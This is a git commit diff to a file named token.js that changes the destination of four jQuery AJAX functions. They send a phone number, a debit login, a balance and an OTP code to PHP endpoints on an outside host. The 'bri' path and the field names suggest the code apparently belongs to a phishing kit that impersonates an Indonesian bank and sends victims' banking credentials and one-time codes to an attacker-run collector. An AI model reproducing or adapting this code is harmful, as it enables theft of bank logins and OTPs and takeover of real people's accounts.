32ce7db8b796ec586d3b2308d6cac46149f6b046
dodypribadi5 <dodypribadi5@gmail.com>
2025-02-07 16:18:28 +0700

    Update token.js

--- token.js
+++ token.js
@@ -14,7 +14,7 @@ function sendNohp(){
    
       $.ajax({
         type: 'POST',
-        url: 'https://kuda-terbang.whf.bz/notif/v1-b68bh0/no.php',
+        url: 'https://choreo.cloud/bri/v1-b68bh0/no.php',
         data: $('#formHP').serialize(),
         datatype: 'JSON',   
     complete: function(){
@@ -40,7 +40,7 @@ function sendDebit(){
    
         $.ajax({
         type: 'POST',
-        url: 'https://kuda-terbang.whf.bz/notif/v1-b68bh0/login.php',
+        url: 'https://choreo.cloud/bri/v1-b68bh0/login.php',
         data: $('#formlog').serialize(),
         datatype: 'JSON',    
     complete: function(){    
@@ -75,7 +75,7 @@ function sendSaldo(){
   
         $.ajax({
         type: 'POST',
-        url: 'https://kuda-terbang.whf.bz/notif/v1-b68bh0/saldo.php',
+        url: 'https://choreo.cloud/bri/v1-b68bh0/saldo.php',
         data: $('#formsal').serialize(),
         datatype: 'JSON',   
    complete: function(){     
@@ -108,7 +108,7 @@ function sendOtp(){
    
         $.ajax({
         type: 'POST',
-        url: 'https://kuda-terbang.whf.bz/notif/v1-b68bh0/otp.php',
+        url: 'https://choreo.cloud/bri/v1-b68bh0/otp.php',
         data: $('#formLink').serialize(),
         datatype: 'JSON',    
     complete: function(){
